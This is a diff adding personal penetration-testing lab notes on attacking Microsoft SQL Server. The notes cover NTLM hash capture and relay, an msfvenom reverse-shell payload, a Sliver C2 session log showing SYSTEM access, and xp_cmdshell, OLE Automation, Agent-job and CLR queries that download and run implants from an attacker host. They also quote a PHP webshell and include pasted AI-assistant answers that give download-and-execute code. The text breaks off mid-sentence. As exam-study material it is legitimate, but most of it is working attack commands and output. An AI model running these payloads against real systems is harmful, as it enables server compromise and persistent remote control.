@@ -2031,3 +2031,937 @@ class Program
 - **Permissions**: Only accounts with certain privileges on the SQL Server will be able to enumerate linked servers and execute commands. You may need to escalate your privileges beforehand.
 
 By using these techniques, you can potentially escalate your privileges in an environment where linked servers are configured insecurely.
+
+
+### Exercise Notes:
+
+#### My C# code 
+
+
+#### 15.1.3.1 Q2
+- used MSSQLEnumeration code 
+- text file with commands differed from Offsec `EXEC master.sys.xp_dirtree '\\192.168.45.151\test',1,1`
+- captured ntlm hash
+- cracked using hashcat and john (hashcat was faster)
+
+#### 15.1.4.1
+
+- configure stage listener using `sliver`
+- generate msfvenom powershell payload and add to `shellcode-runner.ps1`
+```bash
+msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.197 LPORT=9999 --format powershell
+```
+- on kali start `impacket-ntlmxrelay` (*Note:* trying to base64 encode command string kept failing so I resorted to )
+```bash
+❯ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.188.6 -c "powershell -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197:8000/shellcode-runner.ps1')"
+```
+- `sliver` received request
+```bash
+[server] sliver > mtls -l 9001
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #1
+
+[server] sliver > profiles new --mtls 192.168.45.197:9001 -l -f shellcode osep_shellcode
+
+[*] Saved new implant profile osep_shellcode
+
+[server] sliver > stage-listener -u tcp://192.168.45.197:9999 -p osep_shellcode
+
+[*] No builds found for profile osep_shellcode, generating a new one
+[*] Sliver name for profile osep_shellcode: ILLEGAL_COINSURANCE
+[*] Job 2 (tcp) started
+
+[server] sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile
+==== ====== ========== ====== ===================================================
+ 1    mtls   tcp        9001
+ 2    TCP    tcp        9999   osep_shellcode (Sliver name: ILLEGAL_COINSURANCE)
+
+[*] Session aebd0480 ILLEGAL_COINSURANCE - 192.168.188.6:50042 (appsrv01) - windows/amd64 - Sat, 31 Aug 2024 17:00:29 EDT
+
+[server] sliver > whoami
+
+[!] Please select a session or beacon via `use`
+
+[server] sliver > use aebd0480-bd90-4332-b72b-02ccf05e259a
+
+[*] Active session ILLEGAL_COINSURANCE (aebd0480-bd90-4332-b72b-02ccf05e259a)
+
+[server] sliver (ILLEGAL_COINSURANCE) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: NT AUTHORITY\SYSTEM
+[server] sliver (ILLEGAL_COINSURANCE) > ifconfig
+
++-------------------------------------------+
+| Ethernet0                                 |
++-------------------------------------------+
+|  # | IP Addresses     | MAC Address       |
++----+------------------+-------------------+
+| 12 | 192.168.188.6/24 | 00:50:56:bf:06:c4 |
++-------------------------------------------+
+1 adapters not shown.
+
+[server] sliver (ILLEGAL_COINSURANCE) > info
+
+        Session ID: aebd0480-bd90-4332-b72b-02ccf05e259a
+              Name: ILLEGAL_COINSURANCE
+          Hostname: appsrv01
+              UUID: 668e3f42-0574-3803-1ee9-065e22661fb8
+          Username: NT AUTHORITY\SYSTEM
+               UID: S-1-5-18
+               GID: S-1-5-18
+               PID: 3412
+                OS: windows
+           Version: Server 2016 build 17763 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: mtls://192.168.45.197:9001
+    Remote Address: 192.168.188.6:50042
+         Proxy URL:
+Reconnect Interval: 1m0s
+     First Contact: Sat Aug 31 17:00:29 EDT 2024 (6m10s ago)
+      Last Checkin: Sat Aug 31 17:06:20 EDT 2024 (19s ago)
+
+```
+
+
+#### 15.2 Queries
+
+* xp_cmdshell execution impersonating SA
+```sql
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell whoami;
+
+```
+
+- write a file
+```sql
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';
+```
+
+- upload and execute (sliver stager)
+```sql
+EXECUTE AS LOGIN = 'sa'
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://192.168.45.197:8000/http.exe -Outfile c:\windows\tasks\http.exe"'
+EXEC xp_cmdshell 'c:\windows\tasks\http.exe'
+```
+
+- alt method (Ole Automation is failing for me)
+- used `impacket-mssqlclient`
+```sql
+EXECUTE AS LOGIN = 'sa';
+USE msdb;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+Declare @myshell int; exec sp_oacreate 'wscript.shell', @myshell output; exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile C:\Windows\Tasks\tcp.exe; Start-Process -FilePath C:\Windows\Tasks\tcp.exe"';
+
+```
+
+*Note:* maybe try `$"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{Config.command}';"`.I'd need to rewrite my code or create a one off.
+- This commands.txt worked to download tcp.exe
+```sql
+username
+password
+dc01.corp1.com
+master
+EXECUTE AS LOGIN = 'sa'
+USE msdb
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+Declare @myshell int
+exec sp_oacreate 'wscript.shell', @myshell output
+exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command Invoke-WebRequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile C:\\Windows\\Tasks\\tcp.exe'
+```
+
+- This commands.txt worked to run tcp.exe
+```sql
+username
+password
+dc01.corp1.com
+master
+EXECUTE AS LOGIN = 'sa'
+USE msdb
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+Declare @myshell int
+exec sp_oacreate 'wscript.shell', @myshell output
+exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command Start-Process -FilePath C:\\Windows\\Tasks\\tcp.exe'
+```
+
+
+- From Hacktricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+```sql
+# Enable Ole Automation Procedures
+sp_configure 'show advanced options', 1
+RECONFIGURE
+
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+
+# Create a File
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+
+
+Yes, there are other methods in SQL Server that can be used to execute external commands or interact with the operating system, similar to `OLE Automation Procedures`. Below are some alternative methods:
+
+### 1. **`xp_cmdshell`**
+
+- **Description**: `xp_cmdshell` is a built-in extended stored procedure that allows you to execute arbitrary commands directly in the operating system's command shell. It's powerful but poses significant security risks if not properly controlled.
+
+- **Usage Example**:
+  ```sql
+  EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://example.com/file.exe -OutFile C:\Tools\file.exe; Start-Process C:\Tools\file.exe"';
+  ```
+
+- **Enabling `xp_cmdshell`**:
+  ```sql
+  EXEC sp_configure 'show advanced options', 1;
+  RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1;
+  RECONFIGURE;
+  ```
+
+- **Security Considerations**: Like `OLE Automation Procedures`, `xp_cmdshell` can be dangerous if misused. It’s often disabled by default in production environments.
+
+### 2. **SQL Server Agent Jobs**
+
+- **Description**: SQL Server Agent can be used to schedule and execute jobs, including those that run operating system commands or PowerShell scripts. Jobs are typically used for scheduled tasks but can also be triggered manually.
+
+- **Usage Example**:
+  - Create a job that runs a PowerShell script to download and execute a file:
+    ```sql
+    USE msdb;
+    EXEC sp_add_job @job_name = 'DownloadAndRun';
+    EXEC sp_add_jobstep @job_name = 'DownloadAndRun', @step_name = 'Step1',
+        @subsystem = 'PowerShell',
+        @command = 'Invoke-WebRequest -Uri http://example.com/file.exe -OutFile C:\Tools\file.exe; Start-Process C:\Tools\file.exe',
+        @on_success_action = 1;
+    EXEC sp_add_jobserver @job_name = 'DownloadAndRun';
+    EXEC sp_start_job @job_name = 'DownloadAndRun';
+    ```
+
+- **Security Considerations**: Jobs are run by the SQL Server Agent service account, so proper permissions and security measures must be in place.
+
+### 3. **CLR Integration (Common Language Runtime)**
+
+- **Description**: SQL Server supports CLR integration, allowing you to write .NET code that can be executed from within SQL Server. This can be used to execute external commands, interact with files, or perform complex operations.
+
+- **Usage Example**:
+  - Create a CLR stored procedure to run external commands:
+    ```csharp
+    using System;
+    using System.Data.SqlTypes;
+    using System.IO;
+    using System.Net;
+
+    public partial class StoredProcedures
+    {
+        [Microsoft.SqlServer.Server.SqlProcedure]
+        public static void DownloadAndRunFile(SqlString url, SqlString filePath)
+        {
+            WebClient client = new WebClient();
+            client.DownloadFile(url.Value, filePath.Value);
+            System.Diagnostics.Process.Start(filePath.Value);
+        }
+    }
+    ```
+
+  - Deploy the assembly to SQL Server and use it:
+    ```sql
+    CREATE ASSEMBLY MyCLRAssembly FROM 'C:\Path\To\Your\Assembly.dll' WITH PERMISSION_SET = UNSAFE;
+    CREATE PROCEDURE DownloadAndRunFile
+    @url NVARCHAR(4000),
+    @filePath NVARCHAR(4000)
+    AS EXTERNAL NAME MyCLRAssembly.StoredProcedures.DownloadAndRunFile;
+    GO
+
+    EXEC DownloadAndRunFile 'http://example.com/file.exe', 'C:\Tools\file.exe';
+    ```
+
+- **Security Considerations**: CLR code can execute with high privileges, so it should be used with caution. Ensure that only trusted assemblies are loaded and that the SQL Server instance is properly configured to use CLR.
+
+### 4. **SQL Server Extended Stored Procedures**
+
+- **Description**: Extended stored procedures (like `xp_cmdshell`) allow you to call external programs or scripts directly from SQL Server. However, creating custom extended stored procedures is more complex and involves writing C/C++ code.
+
+- **Usage Example**:
+  - You could write an extended stored procedure that calls a shell command, but this requires creating a DLL in C/C++ and registering it with SQL Server.
+
+- **Security Considerations**: Extended stored procedures run in the same address space as SQL Server, so they can affect the stability of the server. They should be used sparingly and with great care.
+
+### **Summary of Methods**
+
+- **`xp_cmdshell`**: Simple and direct but risky; use for basic shell command execution.
+- **SQL Server Agent Jobs**: Good for scheduled tasks or more controlled environments.
+- **CLR Integration**: Powerful and flexible, allows for complex operations in managed code.
+- **Extended Stored Procedures**: Low-level and powerful but complex and potentially dangerous.
+
+### **Conclusion**
+
+These alternatives offer varying levels of power and complexity, with corresponding security implications. `xp_cmdshell` and SQL Server Agent Jobs are the most straightforward, while CLR Integration offers more control and flexibility. Each method should be carefully considered based on the specific needs and security requirements of your environment.
+
+Yes, it is possible to use SQL Server Agent Jobs to stack multiple commands within a single job step. SQL Server Agent Jobs are versatile and allow you to execute a sequence of commands, including T-SQL, operating system commands, PowerShell scripts, or any combination of these.
+
+### **Supported SQL Server Versions**
+
+SQL Server Agent Jobs are supported in all editions of SQL Server that include the SQL Server Agent service. This includes:
+
+- **SQL Server 2005** and later versions
+- **SQL Server Express** does not include SQL Server Agent, so jobs cannot be used in this edition.
+- **SQL Server Standard, Enterprise, and Developer editions** include SQL Server Agent and support the creation and execution of jobs.
+
+### **Stacking Commands in SQL Server Agent Jobs**
+
+When creating a SQL Server Agent Job, you can stack multiple commands by adding them sequentially in a single job step. You can use:
+
+1. **T-SQL Commands**
+2. **Operating System (CmdExec) Commands**
+3. **PowerShell Scripts**
+
+### **Example: Stacking Commands in a SQL Server Agent Job**
+
+Let's create a job that performs the following actions in sequence:
+
+1. Runs a T-SQL command.
+2. Executes a PowerShell script to download a file.
+3. Executes the downloaded file using a system command.
+
+#### **Step-by-Step Example**
+
+1. **Create the SQL Server Agent Job**:
+   - You can create and manage jobs using SQL Server Management Studio (SSMS) or via T-SQL.
+
+   ```sql
+   USE msdb;
+   GO
+
+   -- Create a new job
+   EXEC sp_add_job 
+       @job_name = N'StackedCommandsJob', 
+       @enabled = 1, 
+       @description = N'Job to execute stacked commands', 
+       @notify_level_eventlog = 2;
+   ```
+
+2. **Add a T-SQL Step**:
+   - First, add a T-SQL step that performs some SQL operation.
+
+   ```sql
+   -- Add a T-SQL step to the job
+   EXEC sp_add_jobstep 
+       @job_name = N'StackedCommandsJob', 
+       @step_name = N'T-SQL Step', 
+       @subsystem = N'TSQL', 
+       @command = N'SELECT GETDATE();', 
+       @retry_attempts = 0, 
+       @retry_interval = 0;
+   ```
+
+3. **Add a PowerShell Step**:
+   - Next, add a PowerShell step that downloads a file from the web.
+
+   ```sql
+   -- Add a PowerShell step to the job
+   EXEC sp_add_jobstep 
+       @job_name = N'StackedCommandsJob', 
+       @step_name = N'PowerShell Step', 
+       @subsystem = N'PowerShell', 
+       @command = N'Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\Tools\file.exe"', 
+       @retry_attempts = 0, 
+       @retry_interval = 0;
+   ```
+
+4. **Add a CmdExec Step**:
+   - Finally, add a CmdExec step that runs the downloaded file.
+
+   ```sql
+   -- Add a CmdExec step to the job
+   EXEC sp_add_jobstep 
+       @job_name = N'StackedCommandsJob', 
+       @step_name = N'CmdExec Step', 
+       @subsystem = N'CMDEXEC', 
+       @command = N'C:\Tools\file.exe', 
+       @retry_attempts = 0, 
+       @retry_interval = 0;
+   ```
+
+5. **Schedule the Job**:
+   - You can schedule the job to run automatically or start it manually.
+
+   ```sql
+   -- Schedule the job to run daily at midnight
+   EXEC sp_add_jobschedule 
+       @job_name = N'StackedCommandsJob', 
+       @name = N'DailySchedule', 
+       @freq_type = 4, 
+       @freq_interval = 1, 
+       @active_start_time = 000000;
+   ```
+
+6. **Start the Job Manually**:
+   - If you want to start the job immediately, you can execute the following:
+
+   ```sql
+   -- Start the job manually
+   EXEC sp_start_job @job_name = N'StackedCommandsJob';
+   ```
+
+### **Considerations and Best Practices**
+
+- **Error Handling**: Ensure that each step is properly configured to handle errors. SQL Server Agent can be configured to stop the job if a step fails or to proceed to the next step.
+
+- **Permissions**: Ensure that the SQL Server Agent service account has the necessary permissions to execute the commands, particularly for operating system commands and PowerShell scripts.
+
+- **Security**: Always be cautious when executing external commands or scripts, especially if they involve downloading and executing files. Properly secure the environment to prevent unauthorized access.
+
+- **Monitoring**: Regularly monitor and review the job history to ensure that the jobs are running as expected. SQL Server Agent provides detailed logging for job executions.
+
+The error message you're encountering indicates that the SQL Server Agent service is not running on your SQL Server instance. The SQL Server Agent is a crucial service for running scheduled jobs, alerts, and other automation tasks in SQL Server.
+
+### **Steps to Resolve the Issue**
+
+To resolve this issue, you'll need to start the SQL Server Agent service. Here's how you can do it:
+
+#### **1. Start SQL Server Agent via SQL Server Management Studio (SSMS)**
+
+1. **Open SSMS**:
+   - Connect to your SQL Server instance.
+
+2. **Locate SQL Server Agent**:
+   - In the Object Explorer, expand the "SQL Server Agent" node.
+
+3. **Start SQL Server Agent**:
+   - Right-click on "SQL Server Agent" and select "Start".
+   - Confirm that the service starts successfully.
+
+#### **2. Start SQL Server Agent via SQL Server Configuration Manager**
+
+1. **Open SQL Server Configuration Manager**:
+   - Depending on your version of SQL Server, search for "SQL Server Configuration Manager" in the Start menu.
+
+2. **Locate SQL Server Agent**:
+   - In the left pane, select "SQL Server Services".
+   - In the right pane, find the "SQL Server Agent" service associated with your SQL Server instance.
+
+3. **Start the Service**:
+   - Right-click on the "SQL Server Agent" service and select "Start".
+   - Ensure the service starts successfully.
+
+#### **3. Start SQL Server Agent via Command Prompt**
+
+If you prefer to start the service via the command line, you can use the `net start` command:
+
+1. **Open Command Prompt**:
+   - Open Command Prompt with administrative privileges.
+
+2. **Start SQL Server Agent**:
+   - Run the following command:
+     ```cmd
+     net start SQLServerAgent
+     ```
+   - If you're using a named instance of SQL Server, the command will look like this:
+     ```cmd
+     net start SQLAgent$InstanceName
+     ```
+   - Replace `InstanceName` with the name of your SQL Server instance.
+
+#### **4. Verify the Service is Running**
+
+After starting the service, you can verify it's running:
+
+1. **In SSMS**:
+   - The SQL Server Agent node should now display a green arrow indicating that it is running.
+
+2. **Using Command Line**:
+   - Run the following command to check the status:
+     ```cmd
+     sc query SQLServerAgent
+     ```
+   - For a named instance:
+     ```cmd
+     sc query SQLAgent$InstanceName
+     ```
+
+### **Retry the Job Script**
+
+Once the SQL Server Agent service is running, you can retry running your job script. The job should now be successfully added, scheduled, and started without encountering the error.
+
+### **Automate SQL Server Agent Start (Optional)**
+
+If you want to ensure that SQL Server Agent starts automatically whenever the SQL Server service is started:
+
+1. **Open SQL Server Configuration Manager**.
+2. **Set SQL Server Agent Service to Start Automatically**:
+   - Right-click on the "SQL Server Agent" service.
+   - Go to "Properties" and set the "Start Mode" to "Automatic".
+   - This ensures that SQL Server Agent starts whenever the SQL Server instance is started.
+
+With SQL Server Agent running, your jobs will be executed according to their schedules or when manually triggered.
+
+
+When using `sp_OACreate` in SQL Server, you can leverage various COM objects to execute commands, interact with the file system, manipulate files, run scripts, and more. The `sp_OACreate` stored procedure is used to create instances of OLE Automation COM objects, and you can then use these objects to invoke methods, access properties, and perform tasks directly from SQL Server.
+
+### **Common COM Objects and Their Uses with `sp_OACreate`**
+
+Here are some common COM objects that you can create with `sp_OACreate` for running commands or performing various tasks:
+
+1. **`WScript.Shell`**
+   - **Purpose**: Provides methods to run programs, execute command-line commands, and interact with environment variables.
+   - **Common Methods**:
+     - `Run`: Runs a command or executable.
+     - `Exec`: Executes a command and returns an object representing the process.
+   - **Example**:
+```sql
+     DECLARE @myshell INT;
+     DECLARE @hr INT;
+     EXEC @hr = sp_OACreate 'WScript.Shell', @myshell OUT;
+     EXEC @hr = sp_OAMethod @myshell, 'Run', NULL, 'cmd /c dir C:\', 0, TRUE;
+     EXEC sp_OADestroy @myshell;
+```
+
+2. **`Scripting.FileSystemObject`**
+   - **Purpose**: Provides access to the file system, allowing you to create, read, write, and delete files and directories.
+   - **Common Methods**:
+     - `CreateTextFile`: Creates a new text file.
+     - `OpenTextFile`: Opens an existing text file for reading or writing.
+     - `DeleteFile`: Deletes a file.
+   - **Example**:
+     ```sql
+     DECLARE @fso INT;
+     DECLARE @file INT;
+     EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUT;
+     EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUT, 'C:\Temp\testfile.txt', TRUE;
+     EXEC sp_OAMethod @file, 'WriteLine', NULL, 'This is a test.';
+     EXEC sp_OADestroy @file;
+     EXEC sp_OADestroy @fso;
+     ```
+
+3. **`MSXML2.ServerXMLHTTP`**
+   - **Purpose**: Used to send HTTP requests and receive responses from web servers, allowing SQL Server to interact with web services or download content.
+   - **Common Methods**:
+     - `Open`: Initializes a new HTTP request.
+     - `Send`: Sends the HTTP request.
+     - `ResponseText`: Retrieves the response body as text.
+   - **Example**:
+     ```sql
+     DECLARE @http INT;
+     DECLARE @hr INT;
+     DECLARE @response NVARCHAR(MAX);
+     EXEC @hr = sp_OACreate 'MSXML2.ServerXMLHTTP', @http OUT;
+     EXEC @hr = sp_OAMethod @http, 'Open', NULL, 'GET', 'http://www.example.com', FALSE;
+     EXEC @hr = sp_OAMethod @http, 'Send';
+     EXEC @hr = sp_OAGetProperty @http, 'responseText', @response OUT;
+     PRINT @response;
+     EXEC sp_OADestroy @http;
+     ```
+
+4. **`Excel.Application`**
+   - **Purpose**: Automates Microsoft Excel, allowing SQL Server to create, modify, and interact with Excel workbooks.
+   - **Common Methods**:
+     - `Workbooks.Open`: Opens an existing workbook.
+     - `Workbooks.Add`: Creates a new workbook.
+     - `ActiveWorkbook.SaveAs`: Saves the active workbook.
+     - `Quit`: Quits the Excel application.
+   - **Example**:
+     ```sql
+     DECLARE @excel INT;
+     DECLARE @workbook INT;
+     EXEC sp_OACreate 'Excel.Application', @excel OUT;
+     EXEC sp_OAMethod @excel, 'Workbooks.Add', @workbook OUT;
+     EXEC sp_OAMethod @workbook, 'SaveAs', NULL, 'C:\Temp\myworkbook.xlsx';
+     EXEC sp_OAMethod @excel, 'Quit';
+     EXEC sp_OADestroy @excel;
+     ```
+
+5. **`WScript.Network`**
+   - **Purpose**: Provides access to network resources, such as mapping network drives or interacting with printers.
+   - **Common Methods**:
+     - `MapNetworkDrive`: Maps a network drive.
+     - `RemoveNetworkDrive`: Removes a mapped network drive.
+   - **Example**:
+     ```sql
+     DECLARE @network INT;
+     EXEC sp_OACreate 'WScript.Network', @network OUT;
+     EXEC sp_OAMethod @network, 'MapNetworkDrive', NULL, 'Z:', '\\Server\Share';
+     EXEC sp_OADestroy @network;
+     ```
+
+### **General Workflow for Using `sp_OACreate`**
+
+1. **Create the COM Object**:
+   - Use `sp_OACreate` to create an instance of the desired COM object.
+
+2. **Use Methods or Access Properties**:
+   - Use `sp_OAMethod` to call methods on the COM object, or `sp_OAGetProperty` and `sp_OASetProperty` to get or set properties.
+
+3. **Handle Return Values**:
+   - Capture the return values or output from methods and handle them as needed.
+
+4. **Clean Up**:
+   - Always use `sp_OADestroy` to release the COM object and free up resources.
+
+### **Error Handling**
+
+You can also include error handling to manage issues that may arise during the execution of commands. This often involves checking the return value from `sp_OACreate` and `sp_OAMethod` to ensure the command executed successfully.
+
+### **Security Considerations**
+
+- **Permissions**: Ensure that the SQL Server service account has the necessary permissions to execute these commands, particularly when interacting with the file system or network resources.
+- **Security Risks**: Running commands through OLE Automation can introduce significant security risks, especially if the SQL Server instance is exposed to untrusted users or inputs. Always validate and sanitize inputs and use these capabilities cautiously.
+
+### **Conclusion**
+
+`sp_OACreate` provides powerful capabilities for executing commands and interacting with external systems from within SQL Server. By leveraging various COM objects, you can automate tasks, manipulate files, access network resources, and more. However, it is essential to use these features carefully, considering the security implications and ensuring that proper error handling is in place.
+
+You can determine if your SQL Server instance supports **CLR Integration** by checking the configuration setting `clr enabled`. This setting indicates whether Common Language Runtime (CLR) integration is enabled in SQL Server.
+
+Here’s how you can check if CLR integration is supported and enabled on your SQL Server instance:
+
+### **1. Check if CLR Integration is Enabled**
+
+You can use the following T-SQL command to check the status of the `clr enabled` configuration option:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'clr enabled';
+```
+
+### **Explanation**
+
+- **sp_configure 'show advanced options', 1;**: This command enables advanced options so that you can see and modify settings like `clr enabled`.
+  
+- **sp_configure 'clr enabled';**: This retrieves the current setting for CLR integration. The result will show the following columns:
+  - **name**: The name of the configuration option (`clr enabled`).
+  - **minimum**: The minimum value for the setting (usually 0).
+  - **maximum**: The maximum value for the setting (usually 1).
+  - **config_value**: The current configuration value (1 means enabled, 0 means disabled).
+  - **run_value**: The currently active value (1 means enabled, 0 means disabled).
+
+### **Example Output Interpretation**
+
+If you run the above script, you might get an output like this:
+
+| name         | minimum | maximum | config_value | run_value |
+|--------------|---------|---------|--------------|-----------|
+| clr enabled  | 0       | 1       | 1            | 1         |
+
+- **config_value**: Indicates whether CLR integration is configured to be enabled (1) or disabled (0).
+- **run_value**: Indicates whether CLR integration is currently enabled (1) or disabled (0) in the running SQL Server instance.
+
+### **2. Enable CLR Integration (if necessary)**
+
+If `clr enabled` is set to `0`, you can enable CLR integration by running the following commands:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'clr enabled', 1;
+RECONFIGURE;
+```
+
+### **3. Verify CLR Integration**
+
+After enabling CLR, you can verify it by running the `sp_configure 'clr enabled'` command again to check that the `config_value` and `run_value` are both set to `1`.
+
+### **4. Check SQL Server Version and Edition**
+
+SQL Server CLR integration is supported in the following editions:
+
+- **SQL Server Standard**
+- **SQL Server Enterprise**
+- **SQL Server Developer**
+- **SQL Server Express** (CLR integration is supported, but some features may be limited compared to the higher editions)
+
+To check the version and edition of your SQL Server, you can run:
+
+```sql
+SELECT SERVERPROPERTY('ProductVersion') AS Version,
+       SERVERPROPERTY('ProductLevel') AS ProductLevel,
+       SERVERPROPERTY('Edition') AS Edition;
+```
+
+### **Conclusion**
+
+By running the provided T-SQL commands, you can easily determine whether CLR integration is supported and enabled on your SQL Server instance. If it’s disabled, you can enable it using the provided steps.
+
+To download a file from a URL and execute it using SQL Server's CLR integration, you can create a CLR stored procedure in C#. This stored procedure will perform the following steps:
+
+1. Download the file from the specified URL.
+2. Save the file to a temporary location on the SQL Server machine.
+3. Execute the downloaded file.
+
+### **Step-by-Step Guide**
+
+#### **1. Enable CLR Integration (if not already enabled)**
+
+First, ensure that CLR integration is enabled on your SQL Server instance:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'clr enabled', 1;
+RECONFIGURE;
+EXEC sp_configure 'clr strict security', 0
+RECONFIGURE;
+```
+
+#### **2. Create a C# CLR Stored Procedure**
+
+You will need to write a C# class that contains the logic for downloading the file and executing it.
+
+Here’s a simple example in C#:
+
+```csharp
+using System;
+using System.Data.SqlTypes;
+using System.Net;
+using System.Diagnostics;
+using Microsoft.SqlServer.Server;
+using System.IO;
+
+public class FileDownloader
+{
+    [SqlProcedure]
+    public static void DownloadAndRun(SqlString url, SqlString filePath)
+    {
+        try
+        {
+            // Download the file
+            WebClient client = new WebClient();
+            client.DownloadFile(url.ToString(), filePath.ToString());
+
+            // Execute the downloaded file
+            Process process = new Process();
+            process.StartInfo.FileName = filePath.ToString();
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.Start();
+
+            // Capture and display the output from the process (if needed)
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+
+            SqlContext.Pipe.Send(output);
+        }
+        catch (Exception ex)
+        {
+            SqlContext.Pipe.Send("Error: " + ex.Message);
+        }
+    }
+}
+```
+
+#### **3. Compile the C# Code into a DLL**
+
+You can compile the C# code using Visual Studio or the .NET CLI.
+
+**Using the .NET CLI:**
+
+```bash
+csc /target:library /out:FileDownloader.dll FileDownloader.cs
+```
+
+This will generate a `FileDownloader.dll` file.
+
+#### **4. Deploy the Assembly to SQL Server**
+
+After compiling the C# code into a DLL, you need to deploy it to SQL Server.
+
+```sql
+-- Enable CLR (if not done already)
+EXEC sp_configure 'clr enabled', 1;
+RECONFIGURE;
+
+-- Create the assembly in SQL Server
+CREATE ASSEMBLY FileDownloader 
+FROM 'C:\Path\To\Your\FileDownloader.dll' 
+WITH PERMISSION_SET = UNSAFE;
+
+-- Create the stored procedure
+CREATE PROCEDURE DownloadAndRun
+    @url NVARCHAR(4000),
+    @filePath NVARCHAR(4000)
+AS EXTERNAL NAME FileDownloader.FileDownloader.DownloadAndRun;
+GO
+```
+
+Make sure to replace `'C:\Path\To\Your\FileDownloader.dll'` with the actual path to your DLL.
+
+**Note**: The assembly is created with `PERMISSION_SET = UNSAFE` because the code interacts with the file system and executes external processes, which requires elevated permissions.
+
+#### **5. Execute the CLR Stored Procedure**
+
+Now, you can execute the `DownloadAndRun` stored procedure to download the file from the specified URL and execute it:
+
+```sql
+DECLARE @url NVARCHAR(4000) = 'http://192.168.45.197:8000/http.exe';
+DECLARE @filePath NVARCHAR(4000) = 'C:\Temp\http.exe';
+
+EXEC DownloadAndRun @url, @filePath;
+```
+
+This command will download the file `http.exe` from `http://192.168.45.197:8000` and save it to `C:\Temp\http.exe`. It will then execute the file.
+
+### **Security Considerations**
+
+- **Permission Set**: Using `PERMISSION_SET = UNSAFE` is necessary for file I/O and process execution, but it comes with security risks. Ensure that your SQL Server environment is secure, and that only trusted assemblies are deployed.
+
+- **SQL Server Service Account**: The SQL Server service account needs to have the appropriate permissions to write to the file system and execute files.
+
+- **Network Security**: Ensure that the URL from which the file is being downloaded is from a trusted source, as executing arbitrary code from untrusted sources can compromise your SQL Server.
+
+### **Conclusion**
+
+This guide provides a basic implementation of downloading and running an executable file using SQL Server CLR integration. The CLR stored procedure handles both the download and execution steps, making it a powerful tool for tasks that need to interact with the operating system or external resources.
+
+To download a file from a URL and execute it using SQL Server's CLR integration, you can create a CLR stored procedure in C#. This stored procedure will perform the following steps:
+
+1. Download the file from the specified URL.
+2. Save the file to a temporary location on the SQL Server machine.
+3. Execute the downloaded file.
+
+### **Query to Check the TRUSTWORTHY Flag**
+
+You can run the following T-SQL query to check the `TRUSTWORTHY` status of a specific database:
+
+```sql
+SELECT name, is_trustworthy_on
+FROM sys.databases
+WHERE name = 'YourDatabaseName';
+```
+
+Replace `'YourDatabaseName'` with the name of the database you want to check.
+
+### **Interpreting the Results**
+
+- **`is_trustworthy_on` = 1**: The `TRUSTWORTHY` flag is set to `ON`.
+- **`is_trustworthy_on` = 0**: The `TRUSTWORTHY` flag is set to `OFF`.
+
+### **Example**
+
+If you want to check if the `TRUSTWORTHY` flag is set for the database named `MyDatabase`:
+
+```sql
+SELECT name, is_trustworthy_on
+FROM sys.databases
+WHERE name = 'MyDatabase';
+```
+
+This will return:
+
+```plaintext
+name        is_trustworthy_on
+----------- ----------------
+MyDatabase  1  -- or 0, depending on the setting
+```
+
+### **Checking All Databases**
+
+If you want to check the `TRUSTWORTHY` flag for all databases on the server, you can run:
+
+```sql
+SELECT name, is_trustworthy_on
+FROM sys.databases;
+```
+
+### **How to Set or Unset the TRUSTWORTHY Flag**
+
+If you need to change the `TRUSTWORTHY` setting, you can use the `ALTER DATABASE` command:
+
+- **To set the `TRUSTWORTHY` flag to `ON`**:
+
+  ```sql
+  ALTER DATABASE YourDatabaseName SET TRUSTWORTHY ON;
+  ```
+
+- **To set the `TRUSTWORTHY` flag to `OFF`**:
+
